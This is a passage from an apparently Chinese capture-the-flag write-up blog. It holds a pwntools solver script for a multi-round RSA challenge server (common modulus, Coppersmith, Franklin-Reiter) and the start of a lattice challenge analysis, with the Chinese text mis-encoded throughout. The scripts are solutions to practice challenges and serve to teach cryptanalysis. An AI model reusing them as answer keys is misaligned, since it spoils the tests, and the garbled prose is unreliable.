class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>, <span class="hljs-number">28932</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;md5(str + &#x27;</span>)<br><br>last = p.recv(<span class="hljs-number">4</span>).decode()<br>p.recvuntil(<span class="hljs-string">b&#x27;[0:5] == &#x27;</span>)<br>known_md5 = p.recv(<span class="hljs-number">5</span>).decode()<br><br>temp = <span class="hljs-string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_md5</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> temp:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> temp:<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> temp:<br>                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> temp:<br>                    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> temp:<br>                        a = (i + j + k + l + m + last).encode()<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(md5(a).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>] == known_md5:<br>                            <span class="hljs-keyword">return</span> i + j + k + l + m<br><br><br>all_md5 = calc_md5()<br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me xxxxx: &#x27;</span>, all_md5.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;n = &#x27;</span>)<br>n = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;e1 = &#x27;</span>)<br>e1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;e2 = &#x27;</span>)<br>e2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;c1 = &#x27;</span>)<br>c1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;c2 = &#x27;</span>)<br>c2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br><br>_, s1, s2 = gcdext(e1, e2)<br>m = <span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n) % n<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Please input your answer:&#x27;</span>, <span class="hljs-built_in">str</span>(m).encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;n = &#x27;</span>)<br>n = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;e = &#x27;</span>)<br>e = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;c = &#x27;</span>)<br>c = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>m = iroot(c, e)[<span class="hljs-number">0</span>]<br>p.sendlineafter(<span class="hljs-string">b&#x27;Please input your answer:&#x27;</span>, <span class="hljs-built_in">str</span>(m).encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;n = &#x27;</span>)<br>n = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;e = &#x27;</span>)<br>e = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;p&gt;&gt;448 = &#x27;</span>)<br>high_p = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;c = &#x27;</span>)<br>c = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>unknown_bits=<span class="hljs-number">448</span><br>high_p=high_p&lt;&lt;unknown_bits<br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = high_p + x<br>x = f.small_roots(X = <span class="hljs-number">2</span>^unknown_bits,beta = <span class="hljs-number">0.4</span>)<br>pp=<span class="hljs-built_in">int</span>(high_p+x[<span class="hljs-number">0</span>])<br>m=<span class="hljs-built_in">pow</span>(c,invert(e,(pp-<span class="hljs-number">1</span>)*(n//pp-<span class="hljs-number">1</span>)),n)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Please input your answer:&#x27;</span>, <span class="hljs-built_in">str</span>(m).encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;n1 = &#x27;</span>)<br>n1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;n2 = &#x27;</span>)<br>n2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;e1 = &#x27;</span>)<br>e1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;e2 = &#x27;</span>)<br>e2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;c1 = &#x27;</span>)<br>c1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;c2 = &#x27;</span>)<br>c2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><br>pp=gcd(n1,n2)<br>q = n1 // pp<br><br>phi = (pp-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>phi2 = (pp-<span class="hljs-number">1</span>)*(n2 // pp-<span class="hljs-number">1</span>)<br>d1 = invert(e1 // <span class="hljs-number">14</span>, phi)<br>d2 = invert(e2 // <span class="hljs-number">14</span>, phi2)<br>m1 = powmod(c1, d1, n1)<br>m2 = powmod(c2, d2, n2)<br>m = crt([m1,m2], [n1,n2])<br><span class="hljs-keyword">assert</span> m % n1 == m1<br><span class="hljs-keyword">assert</span> m % n2 == m2<br>n = q * (n2 // pp)<br>d = invert(<span class="hljs-number">7</span>, (q-<span class="hljs-number">1</span>)*(n2//pp-<span class="hljs-number">1</span>))<br>m = powmod(m, d, n)<br>m = iroot(m, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>p.sendlineafter(<span class="hljs-string">b&#x27;Please input your answer:&#x27;</span>, <span class="hljs-built_in">str</span>(m).encode())<br><br><br>p.recvuntil(<span class="hljs-string">b&#x27;n = &#x27;</span>)<br>n = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;e = &#x27;</span>)<br>e = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;c1 = &#x27;</span>)<br>c1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;c2 = &#x27;</span>)<br>c2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br><br>_sage_const_0 = Integer(<span class="hljs-number">0</span>); _sage_const_1 = Integer(<span class="hljs-number">1</span>); _sage_const_30 = Integer(<span class="hljs-number">30</span>); _sage_const_2 = Integer(<span class="hljs-number">2</span>); _sage_const_0p5 = RealNumber(<span class="hljs-string">&#x27;0.5&#x27;</span>); _sage_const_25 = Integer(<span class="hljs-number">25</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CoppersmithShortPadAttack</span>(<span class="hljs-params">e,n,C1,C2,eps=_sage_const_1 /_sage_const_30 </span>):<br>    P = PolynomialRing(ZZ, names=(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>,)); (x, y,) = P._first_ngens(<span class="hljs-number">2</span>)<br>    ZmodN = Zmod(n)<br>    g1 = x**e - C1<br>    g2 = (x+y)**e - C2<br>    res = g1.resultant(g2)<br>    P = PolynomialRing(ZmodN, names=(<span class="hljs-string">&#x27;y&#x27;</span>,)); (y,) = P._first_ngens(<span class="hljs-number">1</span>)<br>    rres = _sage_const_0 <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(res.coefficients())):<br>        rres += res.coefficients()[i]*(y**(res.exponents()[i][_sage_const_1 ]))<br><br>    diff = rres.small_roots(epsilon=eps)<br>    <span class="hljs-keyword">if</span> diff:<br>        <span class="hljs-keyword">return</span> diff[_sage_const_0 ]<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>r=CoppersmithShortPadAttack(e, n, c1, c2)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">franklinReiter</span>(<span class="hljs-params">n,e,r,c1,c2</span>):<br>    R = Zmod(n)[<span class="hljs-string">&#x27;X&#x27;</span>]; (X,) = R._first_ngens(<span class="hljs-number">1</span>)<br>    f1 = X**e - c1<br>    f2 = (X + r)**e - c2<br>    <span class="hljs-keyword">return</span> Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[_sage_const_0 ])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compositeModulusGCD</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span>(b == _sage_const_0 ):<br>        <span class="hljs-keyword">return</span> a.monic()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> compositeModulusGCD(b, a % b)<br>m=franklinReiter(n,e,r,c1,c2)<br>m=long_to_bytes(m)<br>m=m.decode()[<span class="hljs-number">16</span>:]<br>p.sendlineafter(<span class="hljs-string">b&#x27;Please input the password:&#x27;</span>, <span class="hljs-built_in">str</span>(m).encode())<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="æ·±è‚²æ¯-2021gege"><a class="markdownIt-Anchor" href="#æ·±è‚²æ¯-2021gege"></a> [æ·±è‚²æ¯ 2021]GeGe</h1><h2 id="é¢˜ç›®-22"><a class="markdownIt-Anchor" href="#é¢˜ç›®-22"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">plaintext</span>):<br>    p = getStrongPrime(<span class="hljs-number">3072</span>) <br>    m = bytes_to_long(plaintext)<br>    r = getRandomNBitInteger(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = getRandomNBitInteger(<span class="hljs-number">1024</span>)<br>        g = getStrongPrime(<span class="hljs-number">768</span>)<br>        h = gmpy2.invert(f, p) * g % p<br>        c = (r * h + m * f) % p<br>        <span class="hljs-keyword">return</span> (h, p, c)<br><br>h, p, c = encrypt(flag)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;cipher.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&quot;h = &quot;</span> + <span class="hljs-built_in">str</span>(h) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    f.write(<span class="hljs-string">&quot;p = &quot;</span> + <span class="hljs-built_in">str</span>(p) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    f.write(<span class="hljs-string">&quot;c = &quot;</span> + <span class="hljs-built_in">str</span>(c) + <span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">h = 3967900409518491437091166715380802161532841159072519563471354336400750930009970177101953304861954502146570721506995224520631716261108071684882841102381144720177664434981608584075201907891964214604246219441325377602163957172642582158192223452845671007585556951922415200415538060247456213608112360361636912703380306386439846269645696750929811607783895294670639202472465920599542568227657152922843001792754116981992696203788298740550812661583820191877594185184758074771316815650833195023325150218113883046328740408517222933980589974912467363367727038230703152354450353199257411964288022409128890352346036423792759938468964462267528727695183747947515480432786669353434638860350849296620606820894819933050645748656981993408399675189724419997805599649975500093890450393421897803267909569938850674774386012819838940544502656293639875120854745249463561940935651895728242282430164407574626178693654713011323376912585958110558532953333</span><br><span class="hljs-string">p = 4407206782832544188667944201727813617189883940490534227436068867901196311508151544316989531306678865408607390128649278629254128753967046691736522108356971272311308455619879297358588727267184200777923695048248757115057072357087881336680504033511958280710547178971268670442650871890760916203109226852889599638484429889898210426540567794020013920566784973281560628666918122674783539653720295629054898529900882965691587718212291373734218555167591690910246380516121338139063419587750344469214004539520017140593342859857394308703001939640899189432836134392830208318268131639318655382175643272565186884496188876341460968563623529229713790076050095498053846983536874648190033735162809614805624209827336432223553914651838063614534617044557310972056169869738746432924853953258079006936103497626054364115282007843847693813896856977882285910369660539092462408790126385881581833165309032853389777355480169212478669139225609058338565029211</span><br><span class="hljs-string">c = 4052491539376955553220568757544621659293304958837707160681090710624505862889512520190589879197831394720145909992216099963759496125523078969015706069688556356682711471641851937470179182960755800968587551608595725470945584970094036299764623894583379909329996337429067328575804567222496890803396234507278490116354758303807070775249711087938549824010697869930856205244006491475201993228121418890520174179969294094963249013786611889790711801269524919695653453576043288934196952437164829830756439734795068980207758771052483500272264363028346668629397497794792110170275173209377114274164087320163340547019935562316429227119346802124620682293405375798340275679831750482339301440428527223801872439611461272229275824994734898078664180541096159146759378804836952981089673755590353588900522455968721971944276318473421193690310601002295637581030417570868955379815661133148339565983621730401675643094909263098778572081973142223744746526672</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-22"><a class="markdownIt-Anchor" href="#åˆ†æ-22"></a> åˆ†æ</h2><p>ä¸€é“æ ¼çš„å…¥é—¨é¢˜ï¼Œæ ¼çš„å­¦ä¹ æˆ‘æ˜¯çœ‹è¿™ä½å¸ˆå‚…çš„ï¼Œå…·ä½“åŸç†æˆ‘ä¹Ÿä¸å¤ªæ‡‚ï¼Œçº¯çº¯çš„è„šæœ¬å°å­</p><p><a href="https://dexterjie.github.io/2023/07/28/%E5%88%9D%E8%AF%86%E6%A0%BC">https://dexterjie.github.io/2023/07/28/åˆè¯†æ ¼</a></p><p><a href="https://dexterjie.github.io/2023/07/29/%E6%A0%BC%E5%AF%86%E7%A0%81%E5%85%A5%E9%97%A8">https://dexterjie.github.io/2023/07/29/æ ¼å¯†ç å…¥é—¨</a></p><p>æˆ‘ä»¬çŸ¥é“ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mo>=</mo><msup><mi>f</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>âˆ—</mo><mi>g</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>c</mi><mo>=</mo><mi>r</mi><mo>âˆ—</mo><mi>h</mi><mo>+</mo><mi>m</mi><mo>âˆ—</mo><mi>f</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h=f^{-1}*g\quad mod(p)\\c=r*h+m*f \quad mod(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.058548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p>å¯ä»¥æ±‚å¾—ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo>âˆ—</mo><mi>h</mi><mo>=</mo><mi>k</mi><mo>âˆ—</mo><mi>p</mi><mo>+</mo><mi>g</mi><mspace linebreak="newline"></mspace><mi>g</mi><mo>=</mo><mi>f</mi><mo>âˆ—</mo><mi>h</mi><mo>âˆ’</mo><mi>k</mi><mo>âˆ—</mo><mi>p</mi><mspace linebreak="newline"></mspace><mtext>æ„é€ æ ¼ï¼š</mtext><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>h</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd></mtr></mtable><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>g</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">f*h=k*p+g\\g=f*h-k*p\\æ„é€ æ ¼ï¼šL=(\begin{matrix}1 &amp; h\\0 &amp; p\end{matrix})\\(f,k)L=(f,g)\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">æ„</span><span class="mord cjk_fallback">é€ </span><span class="mord cjk_fallback">æ ¼</span><span class="mord cjk_fallback">ï¼š</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.4000000000000004em;vertical-align:-0.9500000000000004em;"></span><span class="mopen">(</span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">h</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span><span class="mspace newline"></span></span></span></span></p><p>å…·ä½“åŸç†æˆ‘ä¹Ÿä¸ä¼šï¼ˆå“­</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><mi>r</mi><mo>âˆ—</mo><msup><mi>f</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>âˆ—</mo><mi>g</mi><mo>+</mo><mi>m</mi><mo>âˆ—</mo><mi>f</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>f</mi><mo>âˆ—</mo><mi>c</mi><mo>=</mo><mi>r</mi><mo>âˆ—</mo><mi>g</mi><mo>+</mo><mi>m</mi><mo>âˆ—</mo><msup><mi>f</mi><mn>2</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>f</mi><mo>âˆ—</mo><mi>c</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mo>âˆ—</mo><msup><mi>f</mi><mn>2</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>g</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mi>f</mi><mo>âˆ—</mo><mi>c</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>âˆ—</mo><mo stretchy="false">(</mo><msup><mi>f</mi><mn>2</mn></msup><msup><mo stretchy="false">)</mo><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>g</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c=r*f^{-1}*g+m*f\quad mod(p)\\f*c=r*g+m*f^2 \quad mod(p)\\f*c\quad mod(p)=m*f^2\quad mod(g)\\m=(f*c\quad mod(p))*(f^2)^{-1}\quad mod(g)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span 